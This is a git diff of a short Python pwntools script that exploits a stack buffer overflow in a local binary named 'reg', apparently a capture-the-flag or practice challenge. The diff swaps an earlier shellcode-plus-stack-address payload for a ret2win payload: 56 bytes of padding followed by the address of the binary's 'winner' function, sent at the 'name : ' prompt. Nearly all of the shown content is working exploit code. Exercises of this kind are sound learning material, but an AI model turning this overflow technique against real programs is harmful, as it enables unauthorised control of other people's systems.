@@ -5,7 +5,12 @@ from pwn import *
 #context.log_level = 'DEBUG'
 context(os='linux', arch='amd64')
 
-#padding_length = 104
+elf = context.binary = ELF('/home/kali/Downloads/reg')
+
+info("%#x winner", elf.symbols.winner)
+winner_address = p64(elf.symbols.winner)
+
+padding_length = 56
 #ret_offset = -96
 
 log.info('Create IO')
@@ -13,11 +18,11 @@ log.info('Create IO')
 io = process('/home/kali/Downloads/reg')
 
 
-padding = b'A' * (ret_offset - len(shellcode))
-payload = shellcode + padding + p64(stack_address)
+padding = b'A' * padding_length
+payload = padding + winner_address
 
 
-payload = cyclic(200)
+#payload = cyclic(200)
 
 log.info('Send Payload')
 io.sendlineafter('name : ', payload)
